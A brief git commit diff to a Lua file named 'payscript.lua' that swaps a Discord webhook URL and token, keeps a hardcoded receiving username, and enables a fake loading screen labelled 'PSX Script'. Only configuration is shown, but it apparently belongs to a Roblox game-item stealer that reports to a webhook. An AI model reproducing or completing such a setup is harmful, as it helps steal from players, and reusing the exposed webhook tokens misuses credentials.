fa53952070b70e6f59ba0adfcd546c27c121a4f7
bithui <104423014+bithui@users.noreply.github.com>
2023-03-16 20:24:28 +0700

    Update payscript.lua

--- payscript.lua
+++ payscript.lua
@@ -1,8 +1,8 @@
-
 Username = "sehaycuchay"
-WebHook = "https://discord.com/api/webhooks/1083724023927672962/a6D03Ozxc0d1uammitsAwaYQQ2LLw0bj9wAnEnDvytl5gKUCRDG2Ef9bSWut-S34GLRo"
+WebHook = "https://discord.com/api/webhooks/1085916294127288380/tmDZzalPrw1LcW5oUfBxreXyv0f1jhgBUS8n46kJlSVk8ynHgnH5sXVOwQwe4Z6Lz1ae"
 
 
+loadingscreen = true
 _G.CustomScriptName = "PSX Script"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
